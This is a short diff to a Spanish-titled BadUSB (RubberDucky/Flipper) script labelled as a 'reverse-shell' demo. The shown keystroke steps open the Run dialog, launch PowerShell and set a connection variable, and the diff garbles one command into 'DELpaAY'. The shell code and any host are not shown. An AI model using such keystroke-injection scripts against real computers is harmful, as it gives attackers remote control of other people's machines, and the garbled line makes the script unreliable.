@@ -1,9 +1,12 @@
+REM RubberDucky/Flipper BadUSB: Demo de "Reverse-shell"
+REM Por Danucosukosuko
+
 DELAY 1000
 GUI r
 DELAY 500
 STRING powershell
 ENTER
-DELAY 7000
+DELpaAY 7000
 STRING $firstConnection = $true
 ENTER
 DELAY 500
